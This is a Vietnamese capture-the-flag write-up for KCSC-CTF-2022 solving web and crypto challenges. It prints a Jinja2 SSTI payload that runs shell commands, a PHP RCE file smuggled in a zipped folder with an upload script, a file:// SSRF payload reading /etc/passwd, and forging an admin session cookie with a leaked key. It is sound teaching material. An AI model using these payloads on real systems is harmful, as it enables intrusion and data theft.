# KCSC-CTF-2022

Link source: https://drive.google.com/drive/folders/18Op2kK25J82G9WHncGvSAJ_YaK7LEAFP?usp=sharing


## Ent_teleport Flag


Description:

Đây là 1 website có chức năng nhập vào tên người dùng và đăng nhập, sau đó sẽ có chức nang tạo các note cho người dùng.

Solution:

Trang web bị dính lỗi SSTI:

![image](https://user-images.githubusercontent.com/96786536/165206597-faec2314-2d8c-440d-aa57-df6b96aea696.png)

Dùng payload để lấy Flag: `{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('env').read() }}`. Mình dùng ENV để lấy flag vì trong file Docker của source thì author đã cho FLAG và ENV.

Có Flag:

![image](https://user-images.githubusercontent.com/96786536/165206767-dcb51a28-0166-4714-bf32-3a355dca341c.png)

FLAG: `KCSC{p3wp3wp3w_Smash_Th3_Dimension}`

Bonus: Vì có source nên mình giải thích tại sao trang web bị dính SSTI trong khi đã filter:

```python
def body_guard(string):
    # flask SSTI filter 
    evil = ["{","<",">","'","\""]
    if any(x in string for x in evil):
        return False
    else:
        return True
```

Đây là đoạn code dùng để filter các kí tự nhập vào từ note. Nhìn thì có vẻ filter khá kĩ rồi.

Nhưng mọi người nhìn đoạn này:

```python
def note():
    # check username in currnet session
    if "username" in session:
        # get POST data
        if request.method == "POST":
            note = request.form.get("note")
            if not body_guard(note):
                render_template_string("WAF Block your request")
        if session["username"] == "admin":
           return render_template_string(FLAG) 
        return render_template_string(markdown(note))
    else:
        flash('You are not authorized to view this page')
        return redirect(url_for('index'))
 ```
 
 Khi gọi hàm `body_guard` để filter, nếu hàm đó return Flase (phát hiện SSTI) thì sẽ `render_template_string("WAF Block your request")` nhưng không thực hiện return vì vậy chương trình sẽ chạy tiếp xuống dưới để render tiếp cái note có chứa SSTI vừa nhập vào (filter không có ý nghĩa).
 
 ## Client-side Check
 
 Description:
 
 1 trang web có chức năng nhập vào 1 số, check nếu số đó trùng với lucky number thì sẽ có flag, còn không có thì sẽ in ra các dòng khác nhau.
 
 Solution:

Vì tên của bài là `Client-side Check` nên mình sẽ thực hiện check source ở phía client xem có gì không.

Có 1 file nghi ngờ là `index.js`. Khi check file này thì được mã hóa bằng `JSFuck`. Decode `JSFuck` thì được source như sau:

```js
(event) => {
	event.preventDefault();

	item = document.getElementsByName("item")[0].value
	const key = aesjs.utils.utf8.toBytes("KCSC@Secret__KEY")
	const iv = aesjs.utils.utf8.toBytes("KCSC@Padding__@@")

	item = item.length % 16 === 0 ? item : item.concat(Array(16 - item.length%16).fill("\x00").join(""))

	let textBytes = aesjs.utils.utf8.toBytes(item);
	var aesCbc = new aesjs.ModeOfOperation.cbc(key, iv);
	var encryptedBytes = aesCbc.encrypt(textBytes);
	var encrypted = btoa(String.fromCharCode.apply(null, encryptedBytes))

	window.location = window.location.protocol + "//" + window.location.hostname + ":" + window.location.port + window.location.pathname + "?item=" + encodeURIComponent(encrypted)
}
```

Phân tích code thì ta biết là đầu vào của chúng ta sẽ được mã hóa AES CBC rồi mới thực hiện cho vào param để gửi lên server.

Đầu tiên mình nghĩ tấn công CBC bằng flipbyte nhưng thấy chả liên quan gì cả vì mình biêt cả key và iv rồi thì flipbyte làm gì nữa.

Thế nên mình nghĩ để tìm được lucky number thì chúng ta phải brute force nhưng không thể điền trực tiếp số vào param mà phải mã hóa như trên source trước. Vì thế mình đã tạo ra 1 script có chức năng tạo ra các bản mã hóa cho 10000 số và lưu vào file.

```const fs = require('fs');

const key = aesjs.utils.utf8.toBytes("KCSC@Secret__KEY")
const iv = aesjs.utils.utf8.toBytes("KCSC@Padding__@@")

for(var i = 0;i < 10000;i++){
    var item = ""+ i
    item = item.length % 16 === 0 ? item : item.concat(Array(16 - item.length % 16).fill("\x00").join(""))
    
    let textBytes = aesjs.utils.utf8.toBytes(item);
    var aesCbc = new aesjs.ModeOfOperation.cbc(key, iv);
    var encryptedBytes = aesCbc.encrypt(textBytes);
    var encrypted = Buffer.from(encryptedBytes, "utf-8")
    encrypted = encrypted.toString("base64");
    fs.appendFile('tesla.txt', encodeURIComponent(encrypted)+"\n", (err) => {
        if (err) return console.error(err);
        console.log("File successfully written !");
     
    });
    console.log(encrypted)
}
```

Cái AESJS thì mọi người tự link vào nha (link đó có sẵn trong source).

Rồi mình dùng file vừa tạo ra để brute force. Ở bài này mình dùng brute suite cho nhanh, mọi người có thể viết script để brute force.

Sau 1 lúc thì có flag:

![image](https://user-images.githubusercontent.com/96786536/165209793-d51b1a7c-7639-4e7b-ab7d-971f86079c26.png)

Flag: `KCSC{Pl3as3_d0nt_st0r3_th3_s3cr3t_k3y_1n_cl1ent-s1d3_scr1pt!!}`

## Host_timescale 9999

Description:

1 trang web có chức năng upload file image hoặc zip, nếu là file image thì nó sẽ thực hiện lưu vào và in ra list trên trang chủ.

Solution:

Phân tích source có 1 số điểm đáng chú ý là: đầu tiên là trang web sẽ filter extension bằng white list các extension image, tiếp theo nếu là file zip thì nó sẽ thực hiên lưu file zip rồi sau đó unzip file đó, sau khi unzip thì sẽ xóa các file vừa được unzip.

```php
    function getFileinPath($path){
        $files = array_diff(scandir($path), array('..', '.'));

        foreach ($files as $key => $value) {
            // get file extension
            $extension = pathinfo($value, PATHINFO_EXTENSION);
            if (isImg($extension)){
                if(!copyfile($path, $value)){
                    die("Error: copy file failed");
                    exit();
                }
            }
            // delete file
            unlink($path ."/". $value);
        }
    }
```

web sử dụng `unlink` để có thể xóa file. Nhưng chỉ là xóa file nếu nó là folder thì sao ?

![image](https://user-images.githubusercontent.com/96786536/165211711-f9ce3f7f-1c66-481d-b4aa-575620e44b0d.png)

`unlink` xóa file nhưng có vẻ không xóa folder. Vậy thì chúng ta có thể tạo 1 folder có chứa file php thực hiện RCE. Rồi zip folder đó. Khi mà server thực hiện unzip và unlink thì folder đó vẫn còn trên server, truy cập folder đó là RCE.

Đã lên được ý tưởng rồi thì thực hành thôi.

tạo 1 file php lưu vào folder có tên a:

```php
<?php

system('cat ../flag.txt');

?>
```

Script thực hiện upload file và lấy flag:

```python

import requests

FLAG = "KCSC{Brrrrrrrrr_Beyond_the_sp33d0fLight____}"

url = "http://139.180.134.15:10000/"

res = requests.post(url + "upload.php", files={'file2upload': open('a.zip', 'rb')})

res = requests.get(url + "upload/zip/unzipped/a").text

print(res)

```

FLAG: `KCSC{Brrrrrrrrr_Beyond_the_sp33d0fLight____}`

## XOXO

Description:

Đây là 1 bài crypto mình làm được. Author cho 1 file python có chức năng mã hóa.

Solution:

```python
from secret import FLAG
import random
assert FLAG.startswith(b"KCSC{")

def xor(a,b):
    return bytes([x^y for x,y in zip(a,b)])

def encrypt(msg,key):
    msg = msg + bytes(len(key) - (len(msg) % len(key)))
    msg = [msg[i:i+len(key)] for i in range(0,len(msg),len(key))]
    c = []
    for m in msg:
        c.append(xor(m,key))
        key = xor(m,key)
    random.shuffle(c)
    return b''.join(c).hex()

key = random.randbytes(5)
c = encrypt(FLAG,key)
print(c)

# cd8fa01b3db9a1f0374992ce930508d6e3d65f39a2bce73166e191a268789591af2f4da5f6dd1b3d
```

Phân tích qua về cách mã hóa thì FLAG khi được đưa vào hàm encrypt thì sẽ cắt thành các khối bằng nhau có độ dài bằng với độ dài của key (độ dài của key bằng 5). Về cách thức mã hóa thì khối đầu tiên sẽ được xor với key ban đầu, các khối tiếp theo sẽ được xor với `key=xor(m, key)` tức là cipher_text của khối trước. Sau đó random các khối sau khi được mã hóa trong mảng c.

Ý tưởng để lấy được flag là ta sẽ thực hiện xor các khối với nhau để lấy từng phần của flag.

Script giải mã:
```python
def xor(x1, x2):
    return "".join(chr(ord(a) ^ ord(b)) for a, b in zip(x1, x2))

cipher_text = "cd8fa01b3db9a1f0374992ce930508d6e3d65f39a2bce73166e191a268789591af2f4da5f6dd1b3d"

arr = []
arr.append(cipher_text[0:10])
arr.append(cipher_text[10:20])
arr.append(cipher_text[20:30])
arr.append(cipher_text[30:40])
arr.append(cipher_text[40:50])
arr.append(cipher_text[50:60])
arr.append(cipher_text[60:70])
arr.append(cipher_text[70:80])

f = open("a.txt", "w")
for a in arr:
    for b in arr:
        try:
            str = xor(a.decode("hex"), b.decode("hex"))
            f.write(str + "\n")
            print(a, b, str)
        except:
            print(a, b, str)

```

Sau khi chạy nó sẽ ra 1 đống các chuỗi khác nhau, lọc 1 hồi thì được các phần của FLAG như sau:

```
hy}
X0R_1
0rt4n
s_1mp
t_1n_
Crypt
0gr4p
KCSC{
```
Ghép lại và được flag: `KCSC{X0R_1s_1mp0rt4nt_1n_Crypt0gr4phy}`

## Ent_teleport Flag [AGAIN]!

Description:

Khá giống với bài trước nhưng ở bài này đã không thể SSTI được vì đã bị filter thật rồi.

Solution:

Chúng ta tiếp tục phân tích các đoạn code mà chúng ta chưa phân tích.

Đó là chức năng tạo highlight, code, url, screenshot của note.

Chú ý ta thấy ở chức nang screenshot thì sẽ tạo ra 1 webdriver rồi truy cập vào url rồi chụp màn hình nội dung của trang url đó và in ra màn hình.

![image](https://user-images.githubusercontent.com/96786536/165216789-6ec521cd-8dcb-4e73-8c74-eedd41c1d77d.png)

Có vẻ ở đây bị SSRF vì chúng ta có thể gọi bất cứ url nào vào. Thử với payload của SSRF: `[m:screenshot]file://127.0.0.1/etc/paswd[/m:screenshot]`

Thì ra được ảnh chứa content file `etc/passwd` :

![image](https://user-images.githubusercontent.com/96786536/165217241-c3517124-de51-4035-8113-ae7c50593534.png)

Nhìn vào file Docker mà tác fiar cho ta biết vị trì của file `main.py`. Thực hiện đọc file xem có gì không, thì có được 1 thứ rất quan trong (session_key):

![image](https://user-images.githubusercontent.com/96786536/165217411-9cb9102d-c303-40ac-9503-df4cef843841.png)

Dùng session_key đó để tạo 1 cookie set username=admin là có flag:

![image](https://user-images.githubusercontent.com/96786536/165217878-5efeeb8c-a5e0-4c9b-93e9-aa2f5c752cd8.png)

FLAG; `KCSC{1_just_l34rn_h0w_t0_t3l3p0rt_t0_y0u_<3}`

